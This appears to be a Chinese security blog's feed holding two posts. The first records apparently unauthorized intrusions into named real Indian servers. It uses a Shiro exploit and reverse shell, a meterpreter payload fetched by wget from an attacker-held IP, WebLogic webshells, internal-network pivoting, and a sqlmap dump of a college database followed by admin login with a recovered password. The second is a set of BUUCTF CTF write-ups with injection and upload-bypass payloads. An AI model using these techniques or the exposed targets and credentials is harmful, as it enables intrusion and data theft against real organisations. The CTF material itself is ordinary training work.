<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A.binのBlog</title>
  
  
  <link href="https://abinix.top/atom.xml" rel="self"/>
  
  <link href="https://abinix.top/"/>
  <updated>2021-10-28T10:31:41.447Z</updated>
  <id>https://abinix.top/</id>
  
  <author>
    <name>A.bin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>九月境外渗透</title>
    <link href="https://abinix.top/2021/10/28/%E4%B9%9D%E6%9C%88%E5%A2%83%E5%A4%96%E6%B8%97%E9%80%8F/"/>
    <id>https://abinix.top/2021/10/28/%E4%B9%9D%E6%9C%88%E5%A2%83%E5%A4%96%E6%B8%97%E9%80%8F/</id>
    <published>2021-10-28T10:29:38.000Z</published>
    <updated>2021-10-28T10:31:41.447Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="目标一：shiro反序列化"><a href="#目标一：shiro反序列化" class="headerlink" title="目标一：shiro反序列化"></a>目标一：shiro反序列化</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>根据<strong>fofa语句</strong> </p><p>header=”rememberme=deleteMe” &amp;&amp; country!=”CN”</p><p>找到一个印度的站，且带有shiro反序列化漏洞</p><p><a href="https://pro.horaaudit.com/portal/login.lz">https://pro.horaaudit.com/portal/login.lz</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910080935.png"></p><p>​    将它利用，打开shiro利用工具</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910083311.png"></p><p>​    可以看到成功利用漏洞，这里可以反弹shell了</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在服务器中监听端口5555</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910083355.png"></p><p>​    在工具中输入ip，并设置端口</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910125907.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910083440.png"></p><p>​    成功反弹shell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910083512.png"></p><p>​    并且为root权限</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>ifconfig 可以看到有三张网卡</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910083545.png"></p><p>​    使用namp扫端口 得到一些活跃的端口号</p><p>​    <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210910095834.png"></p><h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>frp设置及监听</p><p><strong>修改frp配置文件</strong> frpc.ini</p><p>修改客户端 common，这里使用一个免费的frp穿透网站</p><p><a href="https://freefrp.net/">https://freefrp.net/</a></p><p>![image-20210909194034586](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210909194034586.png)</p><p>​    使用命令<code>./frpc -c frpc.ini</code> 运行（这里因为是服务端，所以是frpc）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909194310.png"></p><p>​    这里就是将kali的地址映射到frp公网中，所以frp端口可以随便填,出现上面的界面说明监听成功</p><h2 id="制作后门马"><a href="#制作后门马" class="headerlink" title="制作后门马"></a>制作后门马</h2><p>使用命令制作后门马</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=frp3.freefrp.net LPORT=34522 -f elf -o mshell.elf</code></p><p>这里端口为frp公网的端口</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909194648.png"></p><p>因为我们要打的是印度的机子，没有webshell，无法直接放上去，所以先将马上传到自己博客中，然后在印度机子上下载即可</p><p>将mshell.elf拖到服务器中 此时马的路径为 <a href="http://118.31.59.38/shell/mshell.elf">http://118.31.59.38/shell/mshell.elf</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909200342.png"></p><p>然后使用命令 wget <a href="http://118.31.59.38/shell/mshell.elf">http://118.31.59.38/shell/mshell.elf</a> 进行下载</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909200458.png"></p><p>下载成功，成功将马传到印度服务器上</p><h2 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h2><p>使用msf的监听模块 use exploit/multi/handler</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909200654.png"></p><p>如上图，分别设置payload，LHOST,LPORT，均为攻击机kali的地址</p><p>使用run命令执行监听</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909200916.png"></p><p>在印度服务器上使用木马</p><p><strong>注意：这里需要将权限提升到777，权限太低使用不了</strong></p><p>命令：<code>chmod 777 mshell.elf</code></p><p>命令：<code>./mshell.elf</code> 使用</p><p>![image-20210909200948528](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210909200948528.png)</p><p>这时返回kali看反应</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210909202956.png"></p><p>成功</p><p>输入shell可进入命令行，background退出，使用sessions -i id 返回会话</p><p>等待后续挖掘(站已关)</p><h1 id="目标二：weblogic漏洞"><a href="#目标二：weblogic漏洞" class="headerlink" title="目标二：weblogic漏洞"></a>目标二：weblogic漏洞</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>利用fofa语句 “weblogic server” &amp;&amp; port=”7001” &amp;&amp; country=”in”</p><p>找到印度的一个具有weblogic洞的网站</p><p><a href="http://203.192.242.9:7001/">http://203.192.242.9:7001/</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210917162250.png"></p><p>打开利用工具进行漏洞版本扫描</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210917162306.png"></p><p>得到administrator管理员账户权限</p><p>上传冰蝎马</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210917162420.png"></p><p>这里的路径为wls-wsat目录</p><p>因为：</p><blockquote><p>在于使用中间件的安全性方面，不进行处理的weblogic中间件会存在wls-wsat组件存在反序列化漏洞，利用该漏洞可执行系统命令，获取操作系统控制权限，特出此文档。因考虑到weblogic最新版本也在此漏洞范围之内，无法解决此漏洞，而将wls-wsat组件包删除后对系统无影响，所以此文档临时将漏洞组件包删除，实现漏洞的修复。</p></blockquote><p>冰蝎连接，密码为默认密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210917162557.png"></p><p>连接成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210918110102.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210917162749.png"></p><p>权限较高，可看到电脑的磁盘分区</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>尝试了几种免杀马，但cs上线未成功，具有windows Defender杀软</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210918165129.png"></p><p>等待后续挖掘</p><h1 id="目标三"><a href="#目标三" class="headerlink" title="目标三"></a>目标三</h1><p>利用同样的漏洞和木马上传方法拿下印度的一台机器</p><p>url：<a href="http://1.186.242.75:7001/">http://1.186.242.75:7001</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922192313.png"></p><p>冰蝎成功连上</p><h1 id="目标四"><a href="#目标四" class="headerlink" title="目标四"></a>目标四</h1><p><a href="http://125.99.109.22:7001/">http://125.99.109.22:7001/</a></p><ul><li>利用扫描工具扫除漏洞，权限较低</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210918213954.png"></p><ul><li>找出web的绝对路径，通过图片信息</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210918214213.png"></p><p>​    这里的图片路径为images路径下，但实际的web路径并不是，我们可以通过命令执行来找出这张    照片在服务器中的实际位置</p><p>​    命令：<code>find /u01/app/oracle/ -name soa_o_newview_cs2_v2_ALL.png</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210918214414.png"></p><p>​    得到这么几个有这张图片的位置</p><ul><li>上传冰蝎shell，路径为上面的路径</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210918214600.png"></p><ul><li>冰蝎连接成功</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210924093220.png"></p><h2 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p>设置监听</p><p>​    use exploit/multi/handler </p><p>​    set payload linux/x64/meterpreter/reverse_tcp </p><p>将木马上传至服务器，并在本地设置监听</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922082720.png"></p><p>成功上线msf</p><p>维持高权限：</p><p>migrate 进程号<br>getpid</p><h3 id="代理流量"><a href="#代理流量" class="headerlink" title="代理流量"></a>代理流量</h3><ul><li>查看路由表，发现一个网段</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922085142.png"></p><ul><li>添加路由</li></ul><p>​    命令：（全局模式下）<code>route add 192.168.1.0 255.255.255.0 3</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922094103.png"></p><p>​    成功添加</p><ul><li><p>使用代理模块</p><p>命令：<code>use auxiliary/server/socks_proxy</code> </p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922110311.png"></p><p>​    进行配置，如上命令</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922110147.png"></p><p>​    开启代理</p><ul><li><p>proxychains4配置</p><p>命令：<code>vim /etc/proxychains4.conf</code></p><p>在最后一行添加sock4</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922110339.png"></p></li><li><p>火狐访问内网</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922110444.png"></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922111054.png"></p><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><ul><li><p>内网端口扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.1.0-255</span><br><span class="line"></span><br><span class="line">set ports 80,21,22,25,443,445,1433,3306,3389</span><br><span class="line"></span><br><span class="line">set threads 10</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922093602.png"></p><p>探测出这么多的活跃端口</p></li><li><p>扫描ms170-10漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.1.1-255</span><br><span class="line"></span><br><span class="line">set threads 10</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922095636.png"></p><p>​    无果</p><ul><li><p>寻找存活主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.1.1-255</span><br><span class="line"></span><br><span class="line">set threads 20</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210922180128.png"></p><p>​    如上图，找到8台存活主机  分别是：</p><p>​    192.168.1.32,192.168.1.109,192.168.1.122,192.168.1.130,192.168.1.129  192.168.1.126,192.168.1.124,192.168.1.219</p><ul><li><p>nmap主机端口扫描</p><p>命令：<code>proxychains4 nmap -T4 -sC -sV 192.168.1.32 192.168.1.109 192.168.1.122</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210924082754.png"></p><p>192.168.1.61 存在海康威视的摄像头</p><p>等待后续挖掘</p><h1 id="目标五"><a href="#目标五" class="headerlink" title="目标五"></a>目标五</h1><p>sqlmap跑到一个站存在sql注入</p><p>域名：<a href="http://www.simscollege.ac.in/">http://www.simscollege.ac.in/</a></p><p>存在注入点处：<a href="http://www.simscollege.ac.in/acadamics.php?id=62">http://www.simscollege.ac.in/acadamics.php?id=62</a></p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>命令：<code>sqlmap -u &quot;http://www.simscollege.ac.in/acadamics.php?id=62&quot; -batch -D lpodwate_dbsimscoll -tables --is-dba</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210928160751.png"></p><p>很多表，全部dumpall吧</p><p>![image-20210928160853652](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210928160853652.png)</p><p>已将4w的数据放入境外数据作业中，进行进一步获取权限，寻找数据中是否有登陆账号密码</p><p>![image-20210928161014187](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210928161014187.png)</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210928161103.png"></p><p>打开tbl_user_access表格，发现admin的账号密码，同样在另外一个表中也发现了账号密码，先试试看吧</p><h2 id="谷歌语法搜后台"><a href="#谷歌语法搜后台" class="headerlink" title="谷歌语法搜后台"></a>谷歌语法搜后台</h2><p>语法：<code>site:simscollege.ac.in intext:login</code></p><p>![image-20210928161223978](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210928161223978.png)</p><p>这里就显示一个，这里也可以修改为intext：admin</p><p>登陆进去</p><p>![image-20210928161439100](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210928161439100.png)</p><p>成功找到登录口</p><p>试试密码，最终通过账号：admin 密码：simsxyz 成功登陆</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210928161531.png"></p><p>应该是查询学生系统的一个站（没有软用，也不像是管理系统）</p><p>![image-20210928161636575](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210928161636575.png)</p><h2 id="查看dba权限"><a href="#查看dba权限" class="headerlink" title="查看dba权限"></a>查看dba权限</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210928161952.png"></p><p>dba权限为false，os-shell不了，没后续了。。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;目标一：shiro反序列化&quot;&gt;&lt;a href=&quot;#目标一：shiro反序列化&quot; class=&quot;headerlink&quot; title=&quot;目标一：shiro反序列化&quot;&gt;&lt;/a&gt;目标一：shiro反序列化&lt;/h1&gt;&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a</summary>
      
    
    
    
    
    <category term="渗透" scheme="https://abinix.top/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF做题</title>
    <link href="https://abinix.top/2021/08/13/BUUCTF%E5%81%9A%E9%A2%98/"/>
    <id>https://abinix.top/2021/08/13/BUUCTF%E5%81%9A%E9%A2%98/</id>
    <published>2021-08-12T16:12:48.000Z</published>
    <updated>2021-08-12T16:27:38.221Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p><strong>来源：</strong>buuctf</p><p><strong>涉及知识点：</strong>文件上传htaccess绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809162834.png"></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>普通的文件上传题目，首先尝试简单的一句话改后缀，尝试普遍的绕过，比如点号或空格什么的，发现都不能被绕过，那么我们上传一个htaccess文件，将该目录下的所有文件解析为php，尝试发现可以进行上传，蚁剑连即可</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>首先尝试常规的改后缀上传</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809162910.png"></p><p>如上图，上传一个一句话木马，并将后缀gif改为php并放包</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809163000.png"></p><p>可以看到网页回显，这个意思应该就是没上传成功</p><p>试了多次绕过方式无果，</p></li></ul><ul><li><p>尝试htaccess上传绕过</p><p>.htaccess可以将所有的文件当成php来解析</p><p>内容如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809163214.png"></p><p>将他上传并改后缀</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809163251.png"></p><p>​    如上图表示上传成功，</p><ul><li><p>这时我们再上传一个带有一句话木马的图片时，他就能将图片解析为php，这里直接上传即可</p><p>ps： 这里不能上传gif，上传jpg或png的即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809163816.png"></p><p>上传成功</p></li><li><p>打开蚁剑，进行连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809163728.png"></p></li></ul><ul><li><p>在根目录下发现flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809164117.png"></p></li></ul><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><strong>来源：</strong>buuctf</p><p><strong>涉及知识点：</strong>md5绕过，php弱类型</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810155005.png"></p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先一个登录框，根据题目猜测应该是和md5有关的知识点，web题的步骤就是看看源码，看看头，看看有无备份文件之类的，于是我们就可以看到一个ｈｉｎｔ，给出了ｓｅｌｅｃｔ语句，那么我们可以利用万能密码，让语句恒真绕过，那么就要思考什么ｍｄ５值的开头能组成万能密码，成功绕过后可以看到ｐｈｐ弱类型的题目，简简单单、</p><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>可以在网页回想中看到ｈｉｎｔ，发现是一条数据库语句</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810155331.png"></p></li></ul><ul><li><p>使用万能密码，这里根据ｗｐ，选择字符ffifdyop</p><p>因为 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c</p><p>而数据库又会把16进制转为ascii解析</p><p>所一最终语句就变为<code>&quot;select * from &#39;admin&#39; where password=&#39;&#39; or&#39;6蒥欓!r,b&#39; &quot;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810155640.png"></p></li></ul><ul><li><p>输入密码后我们进入这个页面</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810155708.png"></p><p>右键查看源码发现有一串ｐｈｐ代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810155723.png"></p><p>一看便知是弱类型比较</p></li><li><p>我们传入两个开头为０ｅ的ｍｄ５即可</p><p>例如：<code>?a=QNKCDZO&amp;b=s878926199a</code></p><p>当然也可以用数组绕过</p></li></ul><ul><li><p>进入下一个页面</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810155926.png"></p><p>仔细一看这里和上一步的区别是这里是强等于</p><p>这时我们可以通过数组绕过</p><p>试两个变量的值都为空，则都为相等</p><p>md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等</p><p>构造ｐａｙｌｏａｄ：<code>param1[]=1&amp;param2[]=3</code></p></li><li><p>得到ｆｌａｇ</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810160205.png"></p></li></ul><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p><strong>来源：</strong>ｂｕｕｃｔｆ</p><p><strong>涉及知识点：ｓｑｌ堆叠注入</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161037.png"></p><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>这是一道ｓｑｌ注入题，首先常规判断，输入几个字段进行判断，了解到这是堆叠注入</p><blockquote><p>顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如：</p><p>select * from users;show databases; </p></blockquote><h2 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>先试几个字符，可以发现这题跟强网杯的一题很像，但是过滤更严了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161227.png"></p></li></ul><p>​    <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161247.png"></p><p>​    过滤了大部分的查询函数</p><ul><li><p>先查询有几个列　语句　<code>1&#39; order by 2#</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161346.png"></p></li><li><p>使用堆叠注入擦查询数据库名　</p><p>语句：<code>1&#39; and 1=2;show databases#</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161513.png"></p><p>得到这么多库名，猜测flag在第一张库中</p></li><li><p>查询表　语句：<code>1&#39; and 1=2;show tables#</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161629.png"></p><p>​    可以看到flag在FlagHere表中</p><ul><li><p>但由于考虑了很多查询语句，这里有一个新的知识点</p><blockquote><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p></blockquote><p>语句：<code>1&#39;; HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></p><p>得到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810161834.png"></p></li></ul><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p><strong>来源：</strong>buuctf</p><p><strong>设计知识点：</strong>php字符解析，php代码审计</p><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先遇到这个题是没有思路的，不知从何下手，先查看源码，发现提示有waf，应该是要绕过，并且在源码中发现了有一个calc.php，进入php，可以看到过滤了一些字符，根据wp了解到php字符解析的知识，利用知识点进行绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810162749.png"></p><h2 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>查看源码发现有些许提示</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810163009.png"></p><p>首先是提示有waf，另外提示有一个calc.php</p><p>应该是输入的算式会被传入到这个calc.php文件里</p></li><li><p>打开calc.php</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810163113.png"></p></li><li><p>分析代码</p><p>foreach 语法结构提供了遍历数组</p><p>并且黑名单中过滤了许多目录查看的字符，也就是存在waf，需要选择方式绕过</p><p>了解一下php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，<strong>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</strong></p><p>而黑名单中并没有过滤空格，并且我们用ｃｈａｒ（）来绕过ｗａｆ</p><p>利用语句scandir(/)查看目录</p><p>最终payload：<code>?　num=1;var_dump(scandir(chr(47)))</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810163501.png"></p><p>​    </p><p>​    命令为查看根目录下的文件</p><ul><li><p>接下来就很简单了，我们进行查看即可，php中查看文件函数为　file_get_contents（）</p><p>flag在flagg文件中，所以我们将flagg转化为char类型即可</p><p>payload：<code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p><p>![image-20210810163721778](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210810163721778.png)</p><p>得到flag</p></li></ul><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><strong>来源：</strong>ｂuuctf</p><p><strong>设计知识点：</strong>抓包改包，脑洞</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810164515.png"></p><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>做完还是绝的不难的，首先看看源码有无信息，有无备份文件，我们在第二个页面发现了有一串ｐｈｐ注释，理解代码可以知道需要post两个值，ｅｍｍｍ网上还有一种做法是利用　strcmp漏洞和　is_numeric()漏洞，但我觉得可以用更简单的做法来做，money参数可以利用科学计数法绕过，password可以利用字符串特性绕过</p><h2 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>进去发现有一个menu，点一下，进去一个页面</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810164640.png"></p></li></ul><p>​    提示要付钱得到flag，查看一下源码</p><p>​    <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810164653.png"></p><ul><li><p>理解一下代码，需要post两个值一个money一个是password</p><p>password要让他等于４０４，这个我们可以通过在４０４后面加个ａ绕过，这样ｐｈｐ会解析为４０４</p><p>money可以通过科学计数法绕过</p><p>抓包查看，并重放包</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810165722.png"></p><p>如图我们可以看到回显了一句话，大致意思就是没有这个权限，我们观察包发现user＝０，根据常规思路把他改为１即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810165822.png"></p><p>提示密码正确，接下来传入money即可</p></li></ul><ul><li><p>如果money为1000000则会显示数字太长的回响，这里我们使用科学计数法即可</p><p>即money=1e10</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210810165909.png"></p><p>如图，成功得到flag</p></li></ul><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p><strong>来源：</strong>buuctf</p><p><strong>设计知识点：</strong>sql注入</p><h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>查看页源码，可以发现有隐藏页面，利用联合注入的特性，当查询不到语句时，就会构造一个虚拟的数据，由此我们可以进行伪造登陆</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812085514.png"></p><h2 id="解题步骤-5"><a href="#解题步骤-5" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>查看源码发现有一个search.php，</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812085700.png"></p></li><li><p>登陆后得到一串编码，将他base32＋base64解码后得到</p><p>select * from user where username = ‘$name’</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812085825.png"></p><p>很明显这是一条sql语句</p></li><li><p>返回登陆页构造语句查询字段  <code>1&#39; Order by 3#</code> (这里order by 被pass了，可以用大小写绕过)</p><p>得到</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812090148.png"></p><p>提示wrong user，那试试user为admin呢？</p></li><li><p>当user为admin时，提示密码错误，这里我们可以得知账号一定得为adimn</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812090316.png"></p></li><li><p>使用联合注入 <code>1&#39; union select 1,&#39;admin&#39;,3#</code> 判断用户名是在第几列</p><p>可以发现输入<code>1&#39; union select 1,2,3#</code>是用户名错误，<code>1&#39; union select 1,&#39;admin&#39;,3#</code>是密码错误，所以判断admin是在第二列</p></li></ul><ul><li><p>这里了解到一个新知识，联合查询的技巧</p><p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p></li><li><p>所以我们只需构造一个密码即可，字段2为用户，字段3为密码</p><p>语句：<code>1&#39; union select 1,&#39;admin&#39;,&#39;81dc9bdb52d04dc20036dbd8313ed055&#39;#</code></p><p>这里是将密码1234转为md5值</p><p><img 